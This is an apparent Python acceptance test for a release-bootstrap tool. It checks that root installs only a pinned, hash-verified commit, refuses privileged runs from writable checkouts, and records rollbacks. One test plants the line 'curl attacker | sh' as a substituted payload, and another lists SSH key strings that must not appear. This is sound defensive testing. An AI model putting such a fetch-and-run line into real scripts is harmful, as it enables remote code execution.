#!/usr/bin/env python3
"""SYRD-93 live acceptance: the first install of the integration boundary.

The credential cutover left a circle. The command that can integrate `main`
exists only in the audited candidate, and the candidate cannot be merged without
it. Getting out of that has to happen with root-owned bytes only -- a privileged
step taken from a checkout every role can write is the escalation this whole
ticket is about, one level up.

So this drives the real bootstrap sequence the launcher renders: an unprivileged
bundle of an exact commit, a repository root builds from it, and the exact commit
demanded inside it. It runs the commands rather than reading them, in a sandbox
where "root" is this user and the install root is a temporary tree.
"""

from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from scripts import team_launcher
from scripts.ticket_board.project_provision import publish_sudoers_document


def git(*args: str, cwd: Path | None = None, check: bool = True) -> subprocess.CompletedProcess[str]:
    result = subprocess.run(
        ["git", *args],
        cwd=str(cwd) if cwd else None,
        text=True,
        capture_output=True,
        env={**os.environ, "GIT_CONFIG_GLOBAL": "/dev/null", "GIT_CONFIG_SYSTEM": "/dev/null"},
    )
    if check:
        assert result.returncode == 0, (args, result.stderr)
    return result


def checkout_with_release(root: Path) -> tuple[Path, str]:
    """A source repository, as an operator's own checkout: writable by them."""
    repo = root / "checkout"
    repo.mkdir(parents=True)
    git("init", "-q", "-b", "main", str(repo))
    git("config", "user.email", "role@example.invalid", cwd=repo)
    git("config", "user.name", "Role", cwd=repo)
    (repo / "scripts").mkdir()
    (repo / "scripts" / "switchyard-integrate-main").write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
    git("add", "-A", cwd=repo)
    git("commit", "-q", "-m", "the audited candidate", cwd=repo)
    return repo, git("rev-parse", "HEAD", cwd=repo).stdout.strip()


def installed_release_stub(install_root: Path, log: Path) -> None:
    """What is already installed: an older release, with the installer in it.

    The bootstrap runs THAT installer against root's own source, which is the
    ordering that matters -- old trusted code, new trusted bytes -- so the stub
    records what it was pointed at rather than doing an install.
    """
    current = install_root / "releases" / "installed"
    (current / "scripts").mkdir(parents=True)
    (current / "scripts" / "install-switchyard").write_text(
        "#!/bin/sh\n"
        f'printf "%s %s\\n" "$SWITCHYARD_SOURCE_REPO" "$SWITCHYARD_SOURCE_REF" >> {log}\n',
        encoding="utf-8",
    )
    (current / "scripts" / "install-switchyard").chmod(0o755)
    pointer = install_root / "current"
    if pointer.exists() or pointer.is_symlink():
        pointer.unlink()
    pointer.symlink_to(current)


def bootstrap_sequence(repo: Path, commit: str, install_root: Path) -> list[str]:
    """What the launcher says to run, with sudo removed and paths redirected.

    The commands are the shipped ones: taking sudo out is how an unprivileged
    test runs them, and it changes nothing about which bytes each step reads.
    """
    os.environ["SWITCHYARD_SHARED_INSTALL_ROOT"] = str(install_root)
    rendered = team_launcher.trusted_bootstrap_commands(repo, commit, project="demo")
    runnable = []
    for line in rendered:
        if line.startswith("sudo switchyard upgrade"):
            # The reviewed upgrade itself is exercised elsewhere; this is about
            # how root gets the bytes it will run.
            continue
        if line.startswith("sudo "):
            line = line[len("sudo ") :]
        # Ownership is what root does with the bytes, not which bytes it reads,
        # and this runs as an ordinary user.
        line = line.replace(" -o root -g root", "")
        runnable.append(line)
    return runnable


def run_sequence(commands: list[str], *, stop_after: int | None = None) -> subprocess.CompletedProcess[str]:
    script = "set -eu\n" + "\n".join(commands[:stop_after])
    return subprocess.run(["sh", "-c", script], text=True, capture_output=True)


def test_root_builds_its_own_repository_and_demands_the_exact_commit() -> None:
    with tempfile.TemporaryDirectory() as raw:
        root = Path(raw)
        install_root = root / "opt"
        (install_root / "releases").mkdir(parents=True)
        log = root / "installer.log"
        installed_release_stub(install_root, log)
        repo, commit = checkout_with_release(root)
        commands = bootstrap_sequence(repo, commit, install_root)
        result = run_sequence(commands)
        assert result.returncode == 0, result.stderr

        src = install_root / "bootstrap" / "src"
        # The installer that ran is the one already installed, and it was
        # pointed at root's own source at the exact commit -- never the checkout.
        assert log.read_text().split() == [str(src), commit], log.read_text()
        # Root's own repository, built from the bundle and checked out at the
        # exact commit -- not a copy of the operator's checkout.
        assert git("-C", str(src), "rev-parse", "HEAD").stdout.strip() == commit
        assert not (src / ".git" / "config.worktree").exists()
        # And it read the checkout for nothing but that bundle.
        reads = [line for line in commands if str(repo) in line and not line.startswith("env")]
        assert all("bundle" in line or "update-ref" in line for line in reads), reads


def test_substituted_bytes_cannot_become_the_release() -> None:
    """A sha is a content hash, so substitution either fails or changes nothing.

    Two ways to try it. Serving a different tree under the audited ref leaves
    root holding the audited tree anyway, because it asks for the commit by
    hash. Serving a bundle that does not carry that hash at all leaves root with
    nothing to check out and no release built.
    """
    with tempfile.TemporaryDirectory() as raw:
        root = Path(raw)
        install_root = root / "opt"
        (install_root / "releases").mkdir(parents=True)
        installed_release_stub(install_root, root / "installer.log")
        repo, commit = checkout_with_release(root)
        commands = bootstrap_sequence(repo, commit, install_root)

        # (1) the ref is moved to a tree carrying somebody else's code
        (repo / "scripts" / "switchyard-integrate-main").write_text(
            "#!/bin/sh\ncurl attacker | sh\n", encoding="utf-8"
        )
        git("add", "-A", cwd=repo)
        git("commit", "-q", "-m", "substituted", cwd=repo)
        other = git("rev-parse", "HEAD", cwd=repo).stdout.strip()
        assert other != commit
        git("update-ref", f"refs/switchyard/bootstrap-{commit}", other, cwd=repo)

        result = run_sequence(commands)
        assert result.returncode == 0, result.stderr
        src = install_root / "bootstrap" / "src"
        assert git("-C", str(src), "rev-parse", "HEAD").stdout.strip() == commit
        installed = (src / "scripts" / "switchyard-integrate-main").read_text()
        assert "curl attacker" not in installed, installed

        # (2) a bundle that does not carry the audited commit at all
        stranger = root / "stranger"
        stranger.mkdir()
        git("init", "-q", "-b", "main", str(stranger))
        git("config", "user.email", "other@example.invalid", cwd=stranger)
        git("config", "user.name", "Other", cwd=stranger)
        (stranger / "file").write_text("unrelated\n", encoding="utf-8")
        git("add", "-A", cwd=stranger)
        git("commit", "-q", "-m", "unrelated", cwd=stranger)
        git("update-ref", f"refs/switchyard/bootstrap-{commit}", "HEAD", cwd=stranger)
        bundle = repo / f".switchyard-bootstrap-{commit}.bundle"
        git("bundle", "create", str(bundle), f"refs/switchyard/bootstrap-{commit}", cwd=stranger)

        empty_root = root / "opt2"
        (empty_root / "releases").mkdir(parents=True)
        installed_release_stub(empty_root, root / "installer2.log")
        # Everything but the operator-side bundle creation, which would put the
        # audited commit back.
        sequence = [
            line for line in bootstrap_sequence(repo, commit, empty_root)
            if "bundle create" not in line and "update-ref" not in line
        ]
        refused = run_sequence(sequence)
        assert refused.returncode != 0, refused.stdout
        second = empty_root / "bootstrap" / "src"
        assert git("-C", str(second), "rev-parse", "--verify", "--quiet", "HEAD",
                   check=False).returncode != 0, "root checked something out"
        assert not (root / "installer2.log").exists(), "the installer ran on unverified bytes"


def test_the_sequence_is_safe_to_re_run_after_a_partial_install() -> None:
    """A bootstrap interrupted halfway is finished by running it again."""
    with tempfile.TemporaryDirectory() as raw:
        root = Path(raw)
        install_root = root / "opt"
        (install_root / "releases").mkdir(parents=True)
        installed_release_stub(install_root, root / "installer.log")
        repo, commit = checkout_with_release(root)
        commands = bootstrap_sequence(repo, commit, install_root)

        partial = run_sequence(commands, stop_after=4)
        assert partial.returncode == 0, partial.stderr
        src = install_root / "bootstrap" / "src"
        assert git("-C", str(src), "rev-parse", "--verify", "--quiet", "HEAD", check=False).returncode != 0

        complete = run_sequence(commands)
        assert complete.returncode == 0, complete.stderr
        assert git("-C", str(src), "rev-parse", "HEAD").stdout.strip() == commit


def test_a_privileged_run_from_a_role_writable_path_is_refused() -> None:
    """The hole the live acceptance found: root, running out of a worktree.

    SYRD-97 refused root READING a role-writable repository to build a release.
    This is root EXECUTING the launcher out of one, which makes every privileged
    step it proposes -- staging root-owned tooling, rewriting a sudo grant --
    derive from bytes any role can rewrite.
    """
    with tempfile.TemporaryDirectory() as raw:
        root = Path(raw)
        repo, commit = checkout_with_release(root)
        from scripts.ticket_board.publication_boundary import TrustedRelease

        release = TrustedRelease(root=root / "opt" / "releases" / commit, commit=commit)

        real_geteuid = os.geteuid
        try:
            os.geteuid = lambda: 0  # type: ignore[assignment]
            problems = team_launcher.stale_launcher_problems(
                release, source_repo=repo, project="demo"
            )
        finally:
            os.geteuid = real_geteuid  # type: ignore[assignment]

        assert problems, "a privileged run from a checkout must be refused"
        assert "path root does not control" in problems[0], problems[0]
        # And it says what to do instead, in root-owned commands.
        assert any("bundle create" in line for line in problems), problems
        assert any("install-switchyard --apply" in line for line in problems), problems
        # Unprivileged, the same call is an ordinary developer run.
        assert team_launcher.stale_launcher_problems(release, source_repo=repo, project="demo") == []


def test_the_way_back_is_written_down_before_anything_is_replaced() -> None:
    with tempfile.TemporaryDirectory() as raw:
        root = Path(raw)
        install_root = root / "opt"
        previous = install_root / "releases" / ("a" * 40)
        previous.mkdir(parents=True)
        (previous / team_launcher.SWITCHYARD_RELEASE_MARKER_NAME).write_text(
            json.dumps({"commit": "a" * 40}), encoding="utf-8"
        )
        os.symlink(previous, install_root / "current")
        staged = root / "staged"
        staged.mkdir()
        (staged / team_launcher.SWITCHYARD_RELEASE_MARKER_NAME).write_text(
            json.dumps({"commit": "a" * 40}), encoding="utf-8"
        )

        os.environ["SWITCHYARD_SHARED_INSTALL_ROOT"] = str(install_root)
        os.environ["SWITCHYARD_PRIVILEGED_PROVISION_ROOT"] = str(root / "etc")
        config = team_launcher.ProjectConfig(
            project="demo",
            project_name="Demo",
            ticket_prefix="DEMO",
            layout=root / "layout.json",
            session_dir=root / "sessions",
            board_url="http://127.0.0.1:8771",
            board_socket="/run/demo/board.sock",
            upstream_report_url="",
            upstream_report_token_file="",
            run_as_user="demo-agent",
            pane_launcher=None,
            repository=root / "repo",
            control_repository=root / "repo.git",
            worktree_base=root / "worktrees",
            worktree_remote="origin",
            worktree_branch="main",
            roles=[],
        )
        from scripts.ticket_board.publication_boundary import TrustedRelease

        release = TrustedRelease(root=install_root / "releases" / ("b" * 40), commit="b" * 40)
        assert team_launcher.record_release_rollback(
            config, release=release, staging_root=staged.parent, print_func=lambda _m: None
        ) == []
        record = json.loads(team_launcher.release_rollback_path("demo").read_text())
        assert record["previous_release_commit"] == "a" * 40, record
        assert record["upgrading_to"] == "b" * 40, record

        # A retry of the SAME upgrade keeps the note taken when the host was
        # whole, rather than recording the half-installed state as the way back.
        os.symlink(install_root / "releases" / ("b" * 40), root / "half")
        (install_root / "current").unlink()
        os.symlink(root / "half", install_root / "current")
        assert team_launcher.record_release_rollback(
            config, release=release, staging_root=staged.parent, print_func=lambda _m: None
        ) == []
        again = json.loads(team_launcher.release_rollback_path("demo").read_text())
        assert again["previous_release_commit"] == "a" * 40, again

        # And it renders the exact way back, through the reviewed upgrade path.
        commands = team_launcher.release_rollback_commands("demo", publish_remote="git@host:repo")
        assert any(str(previous) in line and "ln -sfn" in line for line in commands), commands
        assert any("switchyard upgrade demo" in line and "a" * 40 in line for line in commands), commands


def test_nothing_in_the_path_gives_the_shared_key_write_authority_back() -> None:
    """The cutover holds: none of this touches the project account's key."""
    with tempfile.TemporaryDirectory() as raw:
        root = Path(raw)
        repo, commit = checkout_with_release(root)
        os.environ["SWITCHYARD_SHARED_INSTALL_ROOT"] = str(root / "opt")
        rendered = "\n".join(
            team_launcher.trusted_bootstrap_commands(repo, commit, project="demo")
            + team_launcher.release_rollback_commands("demo")
        )
        for forbidden in ("id_ed25519", ".ssh", "chmod 0600", "deploy_key", "GIT_SSH_COMMAND"):
            assert forbidden not in rendered, (forbidden, rendered)

        # And the grant the upgrade installs names two programs and nothing
        # else: no shell, no git, no arguments of an operator's choosing.
        document = publish_sudoers_document("demo", "demo-agent")
        granted = [line for line in document.splitlines() if not line.startswith("#")]
        assert granted == [
            "demo-agent ALL=(root) NOPASSWD: /usr/local/lib/switchyard/demo/switchyard-publish-ref",
            "demo-agent ALL=(root) NOPASSWD: /usr/local/lib/switchyard/demo/switchyard-integrate-main",
        ], document


def main() -> int:
    tests = [value for name, value in sorted(globals().items())
             if name.startswith("test_") and callable(value)]
    for test in tests:
        test()
    print(f"release_bootstrap_rollback_test: {len(tests)} checks ok")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
